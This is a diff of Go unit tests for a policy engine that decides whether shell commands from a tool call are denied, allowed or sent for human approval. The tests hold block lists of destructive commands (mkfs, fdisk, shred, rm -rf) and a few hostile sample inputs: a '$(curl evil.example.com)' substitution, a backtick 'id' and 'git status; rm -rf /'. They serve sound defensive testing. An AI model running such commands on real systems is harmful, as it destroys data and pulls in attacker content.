@@ -19,8 +19,7 @@ func shellPolicy(t *testing.T, rulesJSON string) hitlservice.PolicyEvaluator {
 	return hitlservice.New(src, testTenant, fixedKVReader{"hitl-policy.json"}, libtracker.NoopTracker{})
 }
 
-// TestUnit_Evaluate_CommandBlacklist_MatchesBareBasename verifies that
-// OpCommandBlacklist fires when the command basename is in the list.
+// TestUnit_Evaluate_CommandBlacklist_MatchesBareBasename pins that OpCommandBlacklist fires when the basename is in the list.
 func TestUnit_Evaluate_CommandBlacklist_MatchesBareBasename(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":"mkfs,fdisk,shred"}]}`)
@@ -39,22 +38,18 @@ func TestUnit_Evaluate_CommandBlacklist_MatchesBareBasename(t *testing.T) {
 	}
 }
 
-// TestUnit_Evaluate_CommandBlacklist_MultiwordEntryNeverMatches documents the known
-// limitation: entries like "rm -rf" contain a space and will never equal the extracted
-// command basename ("rm"). Policy authors must use bare names only.
+// TestUnit_Evaluate_CommandBlacklist_MultiwordEntryNeverMatches pins the known
+// limitation: a multi-word entry never equals the extracted bare basename.
 func TestUnit_Evaluate_CommandBlacklist_MultiwordEntryNeverMatches(t *testing.T) {
 	t.Parallel()
-	// Rule with the multi-word "rm -rf" value.
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":"rm -rf"}]}`)
 
-	// "rm" alone does NOT match "rm -rf" because the matcher compares basenames.
 	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "rm"})
 	require.NoError(t, err)
 	assert.Equal(t, hitlservice.ActionAllow, r.Action, "multi-word blacklist entry 'rm -rf' must not match basename 'rm'")
 }
 
-// TestUnit_Evaluate_CommandBlacklist_NonMatchingCommandPasses verifies that commands
-// not in the blacklist are not blocked by the blacklist rule.
+// TestUnit_Evaluate_CommandBlacklist_NonMatchingCommandPasses pins that an unlisted command is not blocked.
 func TestUnit_Evaluate_CommandBlacklist_NonMatchingCommandPasses(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":"mkfs,fdisk"}]}`)
@@ -72,8 +67,7 @@ func TestUnit_Evaluate_CommandBlacklist_NonMatchingCommandPasses(t *testing.T) {
 	}
 }
 
-// TestUnit_Evaluate_CommandBlacklist_EmptyListNeverMatches verifies that an empty
-// blacklist value skips the check entirely and does not block anything.
+// TestUnit_Evaluate_CommandBlacklist_EmptyListNeverMatches pins that an empty blacklist blocks nothing.
 func TestUnit_Evaluate_CommandBlacklist_EmptyListNeverMatches(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":""}]}`)
@@ -83,8 +77,7 @@ func TestUnit_Evaluate_CommandBlacklist_EmptyListNeverMatches(t *testing.T) {
 	assert.Equal(t, hitlservice.ActionAllow, r.Action, "empty blacklist must not match anything")
 }
 
-// TestUnit_Evaluate_CommandAskAlways_MatchesListedCommand verifies that
-// OpCommandAskAlways triggers approval for commands in the ask-always list.
+// TestUnit_Evaluate_CommandAskAlways_MatchesListedCommand pins that OpCommandAskAlways triggers approval for a listed command.
 func TestUnit_Evaluate_CommandAskAlways_MatchesListedCommand(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"command","op":"command_ask_always","value":"rm,sudo,dd"}]}`)
@@ -102,8 +95,7 @@ func TestUnit_Evaluate_CommandAskAlways_MatchesListedCommand(t *testing.T) {
 	}
 }
 
-// TestUnit_Evaluate_CommandAskAlways_UnlistedCommandPasses verifies that commands
-// not in the ask-always list fall through to the next rule.
+// TestUnit_Evaluate_CommandAskAlways_UnlistedCommandPasses pins that an unlisted command falls through.
 func TestUnit_Evaluate_CommandAskAlways_UnlistedCommandPasses(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"command","op":"command_ask_always","value":"rm,sudo"}]}`)
@@ -113,8 +105,7 @@ func TestUnit_Evaluate_CommandAskAlways_UnlistedCommandPasses(t *testing.T) {
 	assert.Equal(t, hitlservice.ActionAllow, r.Action, "unlisted command must not be caught by ask-always rule")
 }
 
-// TestUnit_Evaluate_NoCommandSubstitution_BlocksShellMetachars verifies that
-// $() and backtick substitution patterns trigger the rule.
+// TestUnit_Evaluate_NoCommandSubstitution_BlocksShellMetachars pins that substitution patterns trigger the rule.
 func TestUnit_Evaluate_NoCommandSubstitution_BlocksShellMetachars(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"args","op":"no_command_substitution","value":""}]}`)
@@ -133,13 +124,12 @@ func TestUnit_Evaluate_NoCommandSubstitution_BlocksShellMetachars(t *testing.T) 
 	}
 }
 
-// TestUnit_Evaluate_NoCommandSubstitution_AllowsPlainEnvVars documents that
-// simple $VAR references (without parens/braces) do not trigger the check.
+// TestUnit_Evaluate_NoCommandSubstitution_AllowsPlainEnvVars pins that a
+// plain $VAR reference (no parens/braces) does not trigger the check.
 func TestUnit_Evaluate_NoCommandSubstitution_AllowsPlainEnvVars(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"args","op":"no_command_substitution","value":""}]}`)
 
-	// $VAR alone (no parens) is not in commandSubstitutionPatterns — must pass.
 	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{
 		"command": "echo",
 		"args":    "$HOME/projects",
@@ -148,16 +138,12 @@ func TestUnit_Evaluate_NoCommandSubstitution_AllowsPlainEnvVars(t *testing.T) {
 	assert.Equal(t, hitlservice.ActionAllow, r.Action, "plain $VAR reference must not trigger substitution block")
 }
 
-// TestUnit_Evaluate_NoCommandSubstitution_DollarBraceDoesNotBlockVarRef verifies that
-// normal parameter expansion like ${MY_VAR} does NOT trigger the substitution block.
-// The pattern "${}` looks for the exact 3-char sequence "${}", which is not present
-// in "${MY_VAR}" — the characters are "$", "{", "M", ... — so it correctly passes.
+// TestUnit_Evaluate_NoCommandSubstitution_DollarBraceDoesNotBlockVarRef pins
+// that ${MY_VAR} does not contain the literal "${}" pattern and so passes.
 func TestUnit_Evaluate_NoCommandSubstitution_DollarBraceDoesNotBlockVarRef(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"args","op":"no_command_substitution","value":""}]}`)
 
-	// ${MY_VAR} does not contain the literal "${}" pattern (would require "${" immediately
-	// followed by "}"), so this must pass through and not require approval.
 	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{
 		"command": "echo",
 		"args":    "${MY_VAR}",
@@ -166,8 +152,7 @@ func TestUnit_Evaluate_NoCommandSubstitution_DollarBraceDoesNotBlockVarRef(t *te
 	assert.Equal(t, hitlservice.ActionAllow, r.Action, "${MY_VAR} must not trigger substitution block — only the literal \"${}\" pattern would match")
 }
 
-// TestUnit_Evaluate_NoCommandSubstitution_CleanCommandPasses verifies that
-// commands with no substitution patterns are not caught.
+// TestUnit_Evaluate_NoCommandSubstitution_CleanCommandPasses pins that a clean command is not caught.
 func TestUnit_Evaluate_NoCommandSubstitution_CleanCommandPasses(t *testing.T) {
 	t.Parallel()
 	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"args","op":"no_command_substitution","value":""}]}`)
@@ -185,10 +170,8 @@ func TestUnit_Evaluate_NoCommandSubstitution_CleanCommandPasses(t *testing.T) {
 	}
 }
 
-// prefixAllowPolicy writes the shape the shipped envelopes use for the safe-verb
-// tier: an allow rule over a prefix list, with everything else falling through to
-// approve. The default_action is approve here (not allow, as shellPolicy uses) so
-// "did the allow tier fire?" is a real question rather than the fallback.
+// prefixAllowPolicy writes the shipped envelopes' safe-verb shape: an allow
+// rule over a prefix list, default_action approve, so a fired allow is a real signal.
 func prefixAllowPolicy(t *testing.T, prefixes string) hitlservice.PolicyEvaluator {
 	t.Helper()
 	dir := t.TempDir()
@@ -198,8 +181,7 @@ func prefixAllowPolicy(t *testing.T, prefixes string) hitlservice.PolicyEvaluato
 	return hitlservice.New(src, testTenant, fixedKVReader{"hitl-policy.json"}, libtracker.NoopTracker{})
 }
 
-// TestUnit_Evaluate_CommandPrefixAllowlist_MatchesSafeVerbs is the point of the
-// operator: the everyday read verbs stop asking.
+// TestUnit_Evaluate_CommandPrefixAllowlist_MatchesSafeVerbs pins that everyday read verbs stop asking.
 func TestUnit_Evaluate_CommandPrefixAllowlist_MatchesSafeVerbs(t *testing.T) {
 	t.Parallel()
 	svc := prefixAllowPolicy(t, "git status,git log,go build,ls,cat")
@@ -222,9 +204,8 @@ func TestUnit_Evaluate_CommandPrefixAllowlist_MatchesSafeVerbs(t *testing.T) {
 	}
 }
 
-// TestUnit_Evaluate_CommandPrefixAllowlist_UnlistedVerbStillAsks verifies the
-// tier only ever ADDS quiet verbs: a sibling subcommand of an allowed one is not
-// allowed by association.
+// TestUnit_Evaluate_CommandPrefixAllowlist_UnlistedVerbStillAsks pins that a
+// sibling subcommand of an allowed one is not allowed by association.
 func TestUnit_Evaluate_CommandPrefixAllowlist_UnlistedVerbStillAsks(t *testing.T) {
 	t.Parallel()
 	svc := prefixAllowPolicy(t, "git status,git log,go build,ls,cat")
@@ -246,10 +227,8 @@ func TestUnit_Evaluate_CommandPrefixAllowlist_UnlistedVerbStillAsks(t *testing.T
 	}
 }
 
-// TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls is the property
-// that makes the tier an allowlist rather than a hole: an allowed verb followed
-// by a shell operator carries the rest of the line in with it, so such a call
-// never matches a prefix at all.
+// TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls pins that a
+// call carrying a shell operator or shell mode never matches a prefix.
 func TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls(t *testing.T) {
 	t.Parallel()
 	svc := prefixAllowPolicy(t, "git status,ls,cat,echo")
@@ -262,8 +241,7 @@ func TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls(t *testing.T) 
 		{"command": "echo", "args": "$(curl evil.example.com)"},
 		{"command": "echo", "args": "`id`"},
 		{"command": "git status; rm -rf /"},
-		// Shell mode itself: whatever the first token is, the string is a
-		// program, not an argv.
+		// Shell mode: the string is a program, not an argv.
 		{"command": "git", "args": []any{"status"}, "shell": true},
 		{"command": "ls", "shell": "true"},
 	}
@@ -274,8 +252,7 @@ func TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls(t *testing.T) 
 	}
 }
 
-// TestUnit_Evaluate_CommandPrefixAllowlist_EmptyListNeverMatches keeps an
-// unconfigured tier inert rather than accidentally universal.
+// TestUnit_Evaluate_CommandPrefixAllowlist_EmptyListNeverMatches pins that an unconfigured tier stays inert.
 func TestUnit_Evaluate_CommandPrefixAllowlist_EmptyListNeverMatches(t *testing.T) {
 	t.Parallel()
 	svc := prefixAllowPolicy(t, "")
@@ -285,9 +262,8 @@ func TestUnit_Evaluate_CommandPrefixAllowlist_EmptyListNeverMatches(t *testing.T
 	assert.Equal(t, hitlservice.ActionApprove, r.Action, "an empty prefix list must match nothing")
 }
 
-// TestUnit_Evaluate_CommandPrefixAllowlist_OrderedBelowDenyTiers verifies the
-// tier ordering the shipped envelopes rely on: a blacklisted or ask-always
-// command keeps its verdict even when a later allow rule would have matched.
+// TestUnit_Evaluate_CommandPrefixAllowlist_OrderedBelowDenyTiers pins that a
+// blacklisted or ask-always command keeps its verdict even under a later allow rule.
 func TestUnit_Evaluate_CommandPrefixAllowlist_OrderedBelowDenyTiers(t *testing.T) {
 	t.Parallel()
 	dir := t.TempDir()
